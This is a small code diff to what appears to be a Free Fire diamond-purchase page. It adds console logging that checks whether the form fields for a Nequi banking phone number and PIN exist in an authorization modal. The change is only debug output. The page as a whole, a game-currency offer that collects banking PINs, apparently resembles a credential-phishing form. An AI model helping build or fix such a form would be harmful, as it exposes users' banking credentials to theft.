@@ -407,6 +407,18 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
               console.log("Modal encontrado, mostrando...");
               modalAuthDinamica.style.display = "flex";
               console.log("Modal display configurado a flex");
+
+              // Verificar que los elementos del formulario existen
+              const telefonoInput = document.getElementById("telefonoNequi");
+              const claveInput = document.getElementById("claveNequi");
+              const montoDiv = document.getElementById("montoClave");
+
+              console.log("telefonoNequi existe:", !!telefonoInput);
+              console.log("claveNequi existe:", !!claveInput);
+              console.log("montoClave existe:", !!montoDiv);
+
+              if (telefonoInput) console.log("telefonoNequi display:", telefonoInput.style.display);
+              if (claveInput) console.log("claveNequi display:", claveInput.style.display);
             } else {
               console.error("Modal modalAutorizacion no encontrado!");
             }
